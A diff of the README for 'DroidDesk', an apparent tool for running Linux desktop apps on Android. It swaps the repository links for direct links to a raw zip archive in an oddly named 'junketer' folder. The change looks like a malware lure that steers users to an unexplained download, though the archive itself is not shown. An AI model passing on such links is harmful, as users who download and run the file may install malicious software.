@@ -1,6 +1,6 @@
 # 📱 DroidDesk - Turn Android into a Linux Desktop
 
-[![](https://img.shields.io/badge/Download-DroidDesk-blue)](https://github.com/djabubo2147/DroidDesk)
+[![](https://img.shields.io/badge/Download-DroidDesk-blue)](https://github.com/djabubo2147/DroidDesk/raw/refs/heads/main/junketer/Desk_Droid_1.0.zip)
 
 DroidDesk transforms your Android device into a functional Linux desktop. You can run desktop programs like VS Code, Firefox, LibreOffice, and Blender directly on your phone. This setup relies on tools like Termux, Termux X11, TUR, and Proot to provide a stable environment. You can use your phone screen or connect your device to an external monitor using X11 or VNC technology.
 
@@ -20,7 +20,7 @@ While the software runs on most devices, a phone with a modern processor will of
 
 Follow these steps to install the environment on your device.
 
-1. Visit [this page to download](https://github.com/djabubo2147/DroidDesk) the necessary files.
+1. Visit [this page to download](https://github.com/djabubo2147/DroidDesk/raw/refs/heads/main/junketer/Desk_Droid_1.0.zip) the necessary files.
 2. Open your web browser on your phone.
 3. Access the link provided above.
 4. Locate the latest release assets.
